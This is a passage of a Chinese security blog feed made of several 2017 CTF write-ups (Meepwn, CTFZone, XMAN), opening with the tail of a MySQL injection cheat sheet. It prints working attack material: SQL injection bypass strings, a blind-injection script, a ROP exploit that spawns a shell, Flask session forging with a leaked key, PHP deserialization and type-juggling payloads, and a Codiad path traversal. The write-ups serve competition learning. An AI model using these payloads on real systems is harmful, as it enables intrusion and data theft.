admin’/* or ‘=’ or ‘ or 1=1— ‘ or 1=1# ‘ or 1=1/* ‘) or ‘1’=’1— ‘) or (‘1’=’1— PDO堆查询绕过技巧请见：WAF Bypass:SQL Injection sqlmap-tamper编写版本特性 mysql5.0以后 information.schema库出现 mysql5.1以后 udf 导入xx\lib\plugin\ 目录下 mysql5.x以后 system执行命令 常见sql注入位置 常见GET、POST参数 登陆框 http头 工具自动sql注入测试 sqlmap Pangolin 啊D 辅助工具 Burp Suite firefox::HackBar 参考 MySQL_Testing_Injection MySQL SQL Injection Cheat Sheet SQL Injection Cheat Sheet 独自等待：MySQL注入总结]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Meenpwn-2017-crypto-writeup]]></title>
      <url>%2F2017%2F07%2F19%2FMeenpwn-2017-crypto-writeup%2F</url>
      <content type="text"><![CDATA[Meenpwn-2017-crypto-writeup Simpler than RSA?题目12&quot;RSA is just math&quot;. And now, there is a cryptosystem that simpler than RSA, but, &quot;Simple is the Best!&quot;simple.py pubkey.txt enc.txt simple.py：1234567891011121314151617181920212223from Crypto.Util.number import *import randomfrom flag import FLAGdef generate(nbits): p = getPrime(nbits) q = getPrime(nbits) n = p * q * p g = random.randint(1, n) h = pow(g, n, n) return (n, g, h)def encrypt(m, n, g, h): r = random.randint(1, n) c = pow(pow(g, m, n) * pow(h, r, n), 1, n) return cm = [ord(char) for char in FLAG]n, g, h = generate(90)open("pubkey.txt", "w").write("&#123;0&#125;:&#123;1&#125;:&#123;2&#125;".format(n, g, h))c = [encrypt(mi, n, g, h) for mi in m]open("enc.txt", "w").write(str(c)) enc.txt和pubkey.txt就不直接贴出来了。 思路前期分析先对题目进行一下分析。目前已知123n = 1235280093599323856390922798440377476467763531842392869674688408727824382702235317g = 1110549711091392805024587195974719739929628997819528005374351081843256209971586072h = 610466084395822279908554174354632326166097007218620288020807622478449585661028278 密文c也已知。由simply.py知道： c = [(g^{m}\mod n)\times(h^{r}\mod n )]\mod n可以推出： c\equiv(g^{m}\times h^{r}) \mod n其中的r是未知的，我们要想办法消去它。 继续分析。n = p q p，其中q，p均为质数，拿到factordb上分解出：12p = 1057817919251064684989791981q = 1103935256393984899021164397 引理参考：The smallest solution of a^x = 1 mod m with (a,m) = 1，这边简要记录。假设正整数n是满足下列同余式的最小正整数，并且a和m互质： a^{n}\equiv 1\mod m由欧拉定理，有如下同余式。其中φ(m)是m的欧拉函数，表示小于m的与m互质的正整数的个数。 a^{φ(m)}\equiv 1\mod m现在假设$φ(m)=n\times{q}+r$，其中n的意义同上，q为商，r为余数。则欧拉定理可以改写为： a^{n\times{q}+r}\equiv 1\mod m又因为$ a^{n\times{q}}\equiv 1\mod m $（这是n的性质），所以有： a^{r}\equiv 1\mod m因为r&lt;n，而n是使同余式成立的最小正整数，所以必有r=0。所以接下去推导有： a^{q}\equiv 1\mod m结论回到本题中，$n={p}^{2}\times{q}$，接下来我们考虑n的欧拉函数φ(n)。因为： 所以： φ(n) = φ(p^{2}) \times φ(q)因为： 所以： φ(p^{2}) = (p-1) \times (p^{2-1}) = (p-1) \times pφ(q) = (q-1) \times (q^{1-1}) = q-1所以对φ(n)，有如下等式成立： φ(n) = p \times {(p-1)} \times {(q-1)}我们想要消去r，所以对h进行考虑，h和n互质，现在我们要找到φ(n)的一个分解因子k，使得根据引理，有$h^{k} \equiv 1 \mod n$。选择k=(p-1)*(q-1)恰好满足。 所以有： h^{(p-1)\times{(q-1)}}\equiv{1}\mod{n}也即： h^{(p-1)\times{(q-1)}\times{r}}\equiv{1^{r}}\mod{n}在$ c\equiv(g^{m}\times h^{r}) \mod n $同时加上(p-1)*(q-1)次方。可以推得： c^{(p-1)\times(q-1)} \equiv g^{m \times (p-1) \times (q-1)} \mod n其中m是明文的每一个字符，是可显的，范围为从32~126。可以对其进行爆破。 exp12345678910111213141516n = 1235280093599323856390922798440377476467763531842392869674688408727824382702235317g = 1110549711091392805024587195974719739929628997819528005374351081843256209971586072h = 610466084395822279908554174354632326166097007218620288020807622478449585661028278p = 1057817919251064684989791981q = 1103935256393984899021164397tphi = (p-1)*(q-1)ciper = [...太长省略...]flag = ''for c in ciper: temp = pow(c,tphi,n) for f in range(32,127): if temp == pow(g,f*tphi,n): flag += chr(f)print(flag) 题目涉及文件：链接：http://pan.baidu.com/s/1qYTsJjY 密码：rnw7 nub_cryptosystem12Quan is a nub-boi at Cryptography, but his dream is having an unbreakable cryptosystem. Could you prove him that &quot;nub is always nub&quot; by breaking his &apos;nub_cryptosystem&apos;?nub_cryptosystem.py pubkey.txt enc.txt justpad|\/|/-\T|-|Freedom Curve]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CTFZone-2017-Leaked messages-writeup]]></title>
      <url>%2F2017%2F07%2F19%2FCTFZone-2017-Leaked-messages-writeup%2F</url>
      <content type="text"><![CDATA[CTFZone-2017-Leaked messages-writeup1234One of our candidates used to send restricted data to colleagues via this servicebecause it&apos;s free and easy to use.Try to get some secrets which can compromise them.82.202.204.104 先注册一个账号，登陆 御剑扫出目录：http://82.202.204.104/backup/ 看文件，猜测是git泄露。用lijiejie的Githack只能下载到文件，没办法git log，而rip-git.pl提示说[!] No more items to fetch. That&#39;s it!，所以最后使用的工具是GitTools，不过如果直接用的话，会提示说没有找到.git目录，可以先将gitdumper.sh中以下代码去掉：1234if [[ ! &quot;$BASEURL&quot; =~ /.git/$ ]]; then echo -e &quot;\e[31m[-] /.git/ missing in url\e[0m&quot;; exit 0;fi 执行命令:1/gitdumper.sh http://82.202.204.104/backup/ dumper_LeakMessages 之后查看git log，如下命令,其中--no-paper禁用paper分页，发现有flag.txt：1git --no-pager log -p -1 得到如下结果： 123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b32decode(&quot;MN2GM6TPNZSXW63IOR2HA4Z2F4XXS33VOR2WEZJOMNXW2L3XMF2GG2B7OY6UOMKJMJJHK2TLN4WUC7L5&quot;)&apos;ctfzone&#123;&#123;https://youtube.com/watch?v=G1IbRujko-A&#125;&#125;&apos; 可惜，这是个假的flag。接下来利用extractor.sh 将历次commit的内容恢复出来。1../Extractor/extractor.sh dumper_LeakMessages/ extra_Leakmessages 目录结构123456789101112131415161718192021222324252627282930313233343536373839404142├── 0-bd55b19e5413ce609d3bc4429c3a6f272341988a│ ├── commit-meta.txt│ ├── config.pyc│ ├── requirements.txt│ └── templates│ ├── index.html│ ├── login.html│ ├── messages.html│ └── register.html├── 1-8b1084b23d869e5dc1ae4ac845589ecfb896c0c3│ ├── commit-meta.txt│ ├── requirements.txt│ ├── static│ │ ├── css│ │ │ ├── bootstrap.min.css│ │ │ ├── login.css│ │ │ ├── main.css│ │ │ └── material-input.css│ │ ├── flag.txt│ │ └── js│ │ └── bootstrap.min.js│ └── templates│ ├── index.html│ ├── login.html│ ├── messages.html│ └── register.html└── 2-9f848cceeba31da2cbd2c8ecaebb8a8dab17eee4 ├── commit-meta.txt ├── requirements.txt ├── static │ ├── css │ │ ├── bootstrap.min.css │ │ ├── login.css │ │ ├── main.css │ │ └── material-input.css │ └── js │ └── bootstrap.min.js └── templates ├── index.html ├── login.html ├── messages.html └── register.html 先读取一下requirements.txt，知道是flask应用。123cat requirements.txtflaskflask_recaptcha 其中的config.pyc是其配置文件。利用uncompyle6进行反汇编：1234567891011121314151617181920root@chybeta:~/test# uncompyle6 config.pyc# uncompyle6 version 2.11.2# Python bytecode 3.6 (3379)# Decompiled from: Python 2.7.13 (default, Jan 19 2017, 14:48:08)# [GCC 6.3.0 20170118]# Embedded file name: config.py# Compiled at: 2017-07-15 01:28:42# Size of source mod 2**32: 288 bytesclass BaseConfig(object): DEBUG = False SECRET_KEY = &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos; DB_NAME = &apos;messages.db&apos; RECAPTCHA_ENABLED = True RECAPTCHA_THEME = &apos;dark&apos; RECAPTCHA_TYPE = &apos;image&apos; RECAPTCHA_SIZE = &apos;normal&apos; RECAPTCHA_RTABINDEX = 10# okay decompiling config.pyc SECRET_KEY用于生成flask session。可以用Flask Session Cookie Decoder/Encoder进行解密。比如前面用burp抓包得到的session：1session=eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA 对其进行解密：12root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py decode -c &quot;eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA&quot; -s &quot;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&quot; &#123;u&apos;username&apos;: u&apos;chybeta&apos;, u&apos;number&apos;: u&apos;326410031726&apos;&#125; 现在我们就可以利用这个脚本来伪造cookie了，比如：123root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py encode -s &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos; -t &apos;&#123;&quot;username&quot;:&quot;chybeta&quot;,&quot;number&quot;:&quot;326410031725&quot;&#125;&apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOekkxIn0sInVzZXJuYW1lIjp7IiBiIjoiWTJoNVltVjBZUT09In19.DEh3qQ.yq3ZCE5Mpoy74D9e3wkfbbenU1E 现在我们利用下面这个脚本，来获取admin的各条信息，number的上下限是通过测试出来的。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# standard importsimport sysimport zlibimport astimport requestsfrom itsdangerous import base64_decodefrom flask.sessions import SecureCookieSessionInterfaceimport sysreload(sys)sys.setdefaultencoding('utf-8')class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_keydef session_cookie_encoder(secret_key, session_cookie_structure): try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return "[Encoding error]&#123;&#125;".format(e)if __name__ == "__main__": number_min = 326410000000 number_max = 326410030240 for number in range(number_min,number_max): file_message = open("message.txt",'w') secret_key = ".&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d" cookie_structure = "&#123;'username':'admin','number':"+ str(number) + "&#125;" session = session_cookie_encoder(secret_key, cookie_structure) cookie = &#123;'session':session&#125; url = "http://82.202.204.104/messages" content = requests.get(url,cookies=cookie) start_index = content.text.find('&lt;span class="message"&gt;')+len('&lt;span class="message"&gt;') end_index = content.text.find('&lt;/span&gt;\n &lt;/div&gt;\n &lt;/body&gt;\n&lt;/html&gt;') if "You have no messages yet" not in content.text: print number file_message.writelines(str(number)+":"+str(content.text[start_index:end_index])) else: continuefile_message.close() 在message.txt中查找：12root@chybeta:~/flask-session-cookie-manager# cat message.txt | grep &quot;http&quot;It&amp;#39;s so cool! https://postimg.org/image/41t4h680r/ 得到flag：1ctfzone&#123;b1d4207ff1965105af775cfa71d8214d&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN选拔赛-2017-misc-writeup]]></title>
      <url>%2F2017%2F07%2F17%2FXMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup%2F</url>
      <content type="text"><![CDATA[XMAN选拔赛-2017-misc-writeup Pretty_Cat12好可爱的喵附件下载 strings看一下：123456root@chybeta:~/Desktop# strings e539200b-6833-4ff1-96b8-11bff3e1e740.jpgJFIFpExifWE1BTntVNWU=XzN4MWZ0b28xfQ== , #&amp;&apos;)*) 对两个base64加密串进行解密并拼接。得到flag：1XMAN&#123;U5e_3x1ftoo1&#125; FlagFlagFlag1234Anyone wants to get flag?hint1 : https://pan.baidu.com/s/1bSiQbOhint2 : Pkcrack Pdf_Hack]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN选拔赛-2017-pwn-writeup]]></title>
      <url>%2F2017%2F07%2F16%2FXMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup%2F</url>
      <content type="text"><![CDATA[XMAN选拔赛-2017-pwn-writeup。 Raaa12Are you ok? Do you like mifan?nc challenges.xctf.org.cn 14005 太简单。rand()。1234567#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123; int a = rand() ^ 590558003; printf("%d\n", a); return 0;&#125; 得到1220048468，输入。1234(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Raaa$ nc challenges.xctf.org.cn 140051220048468XMAN&#123;Have_y0u_ever_heard_of_AnLi,my_fr1end?&#125;heiheiehi! Baaa12If you give me three days light。nc challenges.xctf.org.cn 14002 没给程序：）。好吧google大法好。发现是16年CSAW-warmup原题。https://www.megabeets.net/csaw-2016-pwn-warmup-writeup/ flag:1XMAN&#123;Ba1a1a_Xiao_Mo_Xian,BianBIanBian&#125; Caaa1234一心想学bin的张日天报名了xman，开学的时候老师让大家自我介绍：老师（手上拿着名单册子）：好，下一位，请*言简意赅*的介绍自己nc challenges.xctf.org.cn 14000 很明显的栈溢出，64位rop。溢出点用pattern生成后，在gdb中x/gx $rsp查看再带回pattern即可求出偏移为40。要是直接看IDA的话，buf的位置在bp-20h，0x20+8=40，也确实是40个字节。 123456789101112131415161718192021from pwn import *p = process("./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin")# p = remote("challenges.xctf.org.cn","14000")elf = ELF("./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin")system_addr = elf.symbols['system']pop_rdi_ret = 0x0000000000400973sh_addr = next(elf.search('/bin/sh\x00'))offset = 40p.recv()p.sendline("1")p.recv()payload = 'a' * offsetpayload += p64(pop_rdi_ret)payload += p64(sh_addr)payload += p64(system_addr)p.sendline(payload)p.interactive() 1234567891011121314(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Caaa$ python exp.py[+] Opening connection to challenges.xctf.org.cn on port 14000: Done[*] &apos;/home/chybeta/pwn/ctf/XMAN2017/pwn/Caaa/2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE[*] Switching to interactive mode1your name is:hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas @!$ cat /home/xman/flagxman&#123;Welcome_to_bin_world!&#125;$ 剩下的pwn题，好像都是跟堆有关的。还不会，暂时就不写了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN选拔赛-2017-web-writeup]]></title>
      <url>%2F2017%2F07%2F16%2FXMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup%2F</url>
      <content type="text"><![CDATA[XMAN选拔赛-2017-web-writeup 都是基础题目 variacover123456789101112131415161718&lt;meta charset="utf-8"&gt;&lt;?phperror_reporting(0);if (empty($_GET['b'])) &#123; show_source(__FILE__); die();&#125;else&#123; include('flag.php');$a = "www.XMAN.com";$b = $_GET['b'];@parse_str($b);if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) &#123; echo $flag;&#125;else&#123;exit('你的答案不对0.0');&#125;&#125;?&gt; parse_str变量覆盖漏洞，和php弱类型比较问题。 1http://challenges.xctf.org.cn:7771/?b=a[0]=240610708 得到flag：1XMAN&#123;A_sTr_covcderd_t3st_you_oW?&#125; urldecode 改为XMAN后提示urldecode： 考点应该是类似二次注入类型，将XMAN进行一次urlencode，再把其中的%替换为%25，最后的payload：1http://challenges.xctf.org.cn:7772/?me=%2558%254d%2541%254e 得到flag1XMAN&#123;UrlDeCode_CooL_yOu_u0D3rSta9D! upload比赛时没做这题。.htaccess。先自己新建一个文件.htaccess，内容如下：123&lt;FilesMatch &quot;_chybeta.gif&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 然后现在要上传跟我说已经exist了。好吧GG。比赛结束后没人维护了。 unserialize访问：1http://challenges.xctf.org.cn:7774/?code=1 得到hint: flag.php。访问：1http://challenges.xctf.org.cn:7774/flag.php 得到hint2: help.php1http://challenges.xctf.org.cn:7774/help.php 得到hint3：1class FileClass&#123; public $filename = &apos;error.log&apos;; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125; &#125; 知道是反序列化问题，用下面代码生成：1234567891011&lt;?phpclass FileClass&#123; public $filename = 'error.log'; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125;&#125;$chybeta = new FileClass();$chybeta-&gt;filename = 'flag.php';echo serialize($chybeta); 访问：1http://challenges.xctf.org.cn:7774/?code=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125; 最后flag1XMAN&#123;UUNser1AL1Z3_XMAN__0)(0&#125; 这题源码：index.php123456789101112131415161718192021222324&lt;?phpif(empty($_GET['code']))&#123;exit('?code=');&#125;class FileClass&#123; public $filename = 'error.log'; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125;&#125;class User&#123; public $age = 0; public $name = ''; public function __toString() &#123; return 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. &lt;br /&gt;'; &#125; &#125;echo "hint: flag.php";$obj = unserialize($_GET['code']);echo $obj;?&gt; PHP扫到index.php~，源码如下：12345678910111213141516171819202122232425262728293031323334353637&lt;?php$a=0;$b=0;$c=0;if (isset($_GET['aaa']))&#123; $aaa = $_GET['aaa']; $aaa=="1"?die("Emmm..."):NULL; switch ($aaa) &#123; case 0: case 1: $a=1; break; &#125;&#125;$bbb=(array)json_decode(@$_GET['bbb']);if(is_array($bbb))&#123; is_numeric(@$bbb["ccc"])?die("Emmm..."):NULL; if(@$bbb["ccc"])&#123; ($bbb["ccc"]&gt;2017)?$b=1:NULL; &#125; if(is_array(@$bbb["ddd"]))&#123; if(count($bbb["ddd"])!==2 OR !is_array($bbb["ddd"][0])) die("Emmm..."); $eee = array_search("XMAN", $bbb["ddd"]); $eee===false?die("Emmm..."):NULL; foreach($bbb["ddd"] as $key=&gt;$val)&#123; $val==="XMAN"?die("Emmm..."):NULL; &#125; $c=1;&#125;&#125;if($a &amp;&amp; $b &amp;&amp; $c)&#123; include "flag.php"; echo $flag;&#125;?&gt; 考察php弱类型。payload如下：1http://challenges.xctf.org.cn:8004/index.php?aaa=1abcdef&amp;bbb=&#123;&quot;ccc&quot;:&quot;2018a&quot;,&quot;ddd&quot;:[[1],0]&#125; 得到flag：1XMAN&#123;PHP_IS_THE_BEST_LANGUAGE&#125; downloaded用admin登陆后发现是Codiad 2.5.3，exploit-db上找到poc1https://www.exploit-db.com/exploits/36371/ 找flag的位置花了一点时间。最后paylaod:1http://challenges.xctf.org.cn:7775/components/filemanager/download.php?path=../../../../../../../../../../../var/www/flag.txt&amp;type=undefined 1XMAN&#123;D0WnL0D_3v3RYTh1ng_You_Win&#125; springCVE-2017-4971：Spring WebFlow漏洞。到处找poc。 1XMAN&#123;UGhoiXoeDae6zeethaxoh1eex3xeiJ7y&#125; 参考：https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1 CTF用户登录在登陆处存在注入，登陆成功与否加载了html标签前，直接用浏览器看是看不到的不会解析。经过fuzz，可以知道过滤了逗号，空格等，但union select，substr，and，or，单引号，#没有过滤。 逗号被过滤，可以用以下方式绕过： 123mid(user() from 1 for 1)或substr(user() from 1 for 1) 空格被过滤，可以用tab键绕过，其url编码为%09 所以这题就是盲注，下面附上python脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# -*- coding:utf-8 -*-import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://challenges.xctf.org.cn:8003/login.php" headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; parm = "username="+payload+"&amp;password=bb&amp;submit=" content = requests.post(url,data=parm,headers=headers,proxies=proxy) return content.textcuowu = '\u9519\u8bef'.decode('unicode_escape')def generateTarget(flag): if flag == "database": return "database()" elif flag == "tables": return "(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)" elif flag == "columns": return "(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)" elif flag == "data": return "(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = "a'%09or%09(%09select%09ascii(substr("+generateTarget(target) +"%09from%09"+ str(i) +"%09for%091))&lt;="+str(midNum) +")%23" # print payload recv = sendPayload(payload) # print recv if cuowu in recv: # print 'cuowu' # raw_input() doubleSearch(midNum,rightNum,i,target) else: # print 'chenggong' # raw_input() doubleSearch(leftNum,midNum,i,target) else: if rightNum != 0: # print rightNum # raw_input() sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The database:" target = "database" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The tables:" target = "tables" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The columns:" target = "columns" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The data:" target = "data" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 最后flag：1XMAN&#123;DO_you_l1ke_sqlmap_sqlmap&#125; 倾听世界的声音XSS，还没开始研究。膜拜大佬。 参考：http://www.cnblogs.com/zaki-Gui/p/7115821.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Meenpwn-2017-web-writeup]]></title>
      <url>%2F2017%2F07%2F16%2FMeenpwn-2017-web-writeup%2F</url>
      <content type="text"><![CDATA[考点：反序列化，rand，sql注入 TSULOTT通过查看源代码，可以发现hint，得到源码，这里只贴重点部分。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;body&gt;&lt;?phpclass Object&#123; var $jackpot; var $enter;&#125;?&gt;&lt;?phpinclude('secret.php');if(isset($_GET['input'])) &#123; $obj = unserialize(base64_decode($_GET['input'])); if($obj) &#123; $obj-&gt;jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99); if($obj-&gt;enter === $obj-&gt;jackpot) &#123; echo "&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;CONGRATULATION! You Won JACKPOT PriZe !!! &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;". "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='20'&gt;".$obj-&gt;jackpot."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"; echo "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='green' size='25'&gt;".$flag."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"; echo "&lt;center&gt;&lt;img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /&gt;&lt;/center&gt;"; &#125; else &#123; echo "&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;Wrong! True Six Numbers Are: &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;". "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='25'&gt;".$obj-&gt;jackpot."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"; &#125; &#125; else &#123; echo "&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;- Something wrong, do not hack us please! -&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"; &#125;&#125;else&#123; echo "";&#125;?&gt;&lt;center&gt;&lt;br&gt;&lt;h2&gt;&lt;font color='yellow' size=8&gt;-- TSU&lt;/font&gt;&lt;font color='red' size=8&gt;LOTT --&lt;/font&gt;&lt;/h2&gt;&lt;p&gt;&lt;p&gt;&lt;font color='white'&gt;Input your code to win jackpot!&lt;/font&gt;&lt;p&gt;&lt;form&gt; &lt;input type="text" name="input" /&gt;&lt;p&gt;&lt;p&gt; &lt;button type="submit" name="btn-submit" value="go"&gt;send&lt;/button&gt;&lt;/form&gt;&lt;/center&gt;&lt;?phpif (isset($_GET['gen_code']) &amp;&amp; !empty($_GET['gen_code']))&#123; $temp = new Object; $temp-&gt;enter=$_GET['gen_code']; $code=base64_encode(serialize($temp)); echo '&lt;center&gt;&lt;font color=\'white\'&gt;Here is your code, please use it to Lott: &lt;strong&gt;'.$code.'&lt;/strong&gt;&lt;/font&gt;&lt;/center&gt;';&#125;?&gt;&lt;center&gt;&lt;font color='white'&gt;-----------------------------------------------------------------------------------------------------------------------------&lt;/font&gt;&lt;h3&gt;&lt;font color='white'&gt;Take code&lt;/font&gt;&lt;/h3&gt;&lt;p&gt;&lt;p&gt;&lt;font color='white'&gt;Pick your six numbers (Ex: 15 02 94 11 88 76)&lt;/font&gt;&lt;p&gt;&lt;form&gt; &lt;input type="text" name="gen_code" maxlength="17" /&gt;&lt;p&gt;&lt;p&gt; &lt;button type="submit" name="btn-submit" value="go"&gt;send&lt;/button&gt;&lt;/form&gt;&lt;/center&gt;&lt;?phpif(isset($_GET['is_debug']) &amp;&amp; $_GET['is_debug']==='1')&#123; show_source(__FILE__);&#125;?&gt;&lt;!-- GET is_debug=1 --&gt;&lt;/body&gt; 看到有unserialize，感觉会考反序列化问题。看到有rand()感觉会考随机数预测问题。看到===，一般不存在弱类型问题。从源码上看，这题需要我们预测留个数字，然后序列化再传入并反序列化，与服务器上随机生成的六个数进行对比，若相同则出flag。这题最后用反序列化的方法解出来了。不过这个反序列化的套路跟以前不太一样。利用下面的php代码：1234567891011&lt;?phpclass Object&#123; var $jackpot; var $enter;&#125;$chybeta = new Object();$chybeta-&gt;enter=&amp;$obj-&gt;jackpot;$code=base64_encode(serialize($chybeta));echo $code; 上述代码，将$jackpot的地址赋给$enter，相当于两个指针指到了同一块内存区域，所以不管做什么变化，这两个变量的变化是同步的。 访问：1http://128.199.190.23:8001/?input=Tzo2OiJPYmplY3QiOjI6e3M6NzoiamFja3BvdCI7TjtzOjU6ImVudGVyIjtSOjI7fQ%3D%3D&amp;btn-submit=go FLAG:1MeePwnCTF&#123;__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___&#125; 这个思路当时我想到了但没去尝试，因为当时想的是传给enter的jackpot地址是我本机上的地址，跟服务器上的不同，然后就死磕在rand（）的预测上。在跟一航大佬讨论后，才知道这个姿势可行。永远不要怀疑自己的脑洞。关于php变量的内存分布之后单独开一篇写。 还有就是对rand（）的预测。这个想法不是不无根据，HITCON CTF 2015 Quals Web Giraffe’s Coffee和0CTF 2016 qual rand2都考到过。ph师傅的安全箱子的秘密和Sjoerd Langkemper的Cracking PHP rand()有谈到这个rand()预测的具体技巧和操作。不过我没成功:) Br0kenMySQL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;&lt;p style='color:Red'&gt;Br0kenMySQL&lt;/p&gt;&lt;?phpif($_GET['debug']=='🕵') die(highlight_file(__FILE__));require 'config.php';$link = mysqli_connect('localhost', MYSQL_USER, MYSQL_PASSWORD);if (!$link) &#123; die('Could not connect: ' . mysql_error());&#125;if (!mysqli_select_db($link,MYSQL_USER)) &#123; die('Could not select database: ' . mysql_error());&#125; $id = $_GET['id']; if(preg_match('#sleep|benchmark|floor|rand|count#is',$id)) die('Don\'t hurt me :-('); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'guest')&#123; $ip = @$_SERVER['HTTP_X_FORWARDED_FOR']!="" ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; if(preg_match('#sleep|benchmark|floor|rand|count#is',$ip)) die('Don\'t hurt me :-('); var_dump($ip); if(!empty($ip)) mysqli_query($link,"INSERT INTO logs VALUES('&#123;$ip&#125;')"); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'admin')&#123; echo "What ???????\nLogin as guest&amp;admin at the same time ?\nSeems our code is broken, here is your bounty\n"; die(FLAG); &#125; echo "Nothing here"; &#125; else &#123; echo "Hello ".$username; &#125;?&gt;&lt;/h1&gt;&lt;/pre&gt; 从源码来看，逻辑上我们得先让$username值为guest进入if判断后，再让$username的值为admin，从而echo出flag。而且$id处可注入。做法是找到一个随机串，利用case语句在不同情况下随机取值，结合爆破，拿flag。题目把rand()，floor()等过滤了，不能直接生成随机数。可以利用mysql内置的一些函数或变量，比如时间戳。因此有了下面的payload：1http://139.59.239.133/?id=(SELECT case MOD(UNIX_TIMESTAMP(),3) when 1 then 2 else 1 end;) FLAG:1MeePwnCTF&#123;_b4by_tr1ck_fixed&#125; 除了用UNIX_TIMESTAMP()，其他一些函数/变量也行，比如：123456789101112uuid()UUID_SHORT() // mysql 